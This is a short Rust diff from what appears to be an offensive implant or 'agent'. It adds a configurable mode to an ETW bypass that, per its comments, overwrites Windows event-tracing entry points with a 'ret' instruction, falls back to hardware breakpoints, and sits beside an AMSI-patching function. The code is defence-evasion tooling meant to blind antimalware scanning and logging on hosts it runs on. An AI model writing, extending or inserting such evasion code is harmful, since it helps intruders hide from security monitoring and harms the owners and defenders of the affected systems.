@@ -319,7 +319,7 @@ pub unsafe fn patch_amsi() {
 /// No-op stub on non-Windows; always safe to call.
 pub unsafe fn patch_amsi() {}
 
-/// Apply the ETW bypass using the method configured in the agent config.
+/// Apply the ETW bypass using the method and mode configured in the agent config.
 ///
 /// Defaults to [`common::config::EtwPatchMethod::Direct`] when `method` is
 /// `None`, which overwrites the ETW function entry points with `ret` (0xC3).
@@ -328,14 +328,21 @@ pub unsafe fn patch_amsi() {}
 /// (e.g. `VirtualProtect` is blocked by CFG), the caller should fall back to
 /// `setup_hardware_breakpoints()` independently.
 ///
+/// `mode` controls whether the direct-patch is applied on newer Windows builds
+/// (see [`common::config::EtwPatchMode`]).  Defaults to `Safe` when `None`.
+///
 /// # Safety
 ///
 /// Modifies process state; see [`crate::etw_patch::patch_etw`] and
 /// [`setup_hardware_breakpoints`] for their respective safety requirements.
-pub unsafe fn setup_etw_patch(method: Option<&common::config::EtwPatchMethod>) {
+pub unsafe fn setup_etw_patch(
+    method: Option<&common::config::EtwPatchMethod>,
+    mode: Option<&common::config::EtwPatchMode>,
+) {
     use common::config::EtwPatchMethod;
+    let mode = mode.cloned().unwrap_or_default();
     match method.unwrap_or(&EtwPatchMethod::Direct) {
-        EtwPatchMethod::Direct => crate::etw_patch::patch_etw(),
+        EtwPatchMethod::Direct => crate::etw_patch::patch_etw_with_mode(mode),
         EtwPatchMethod::Hwbp => {
             #[cfg(windows)]
             setup_hardware_breakpoints();
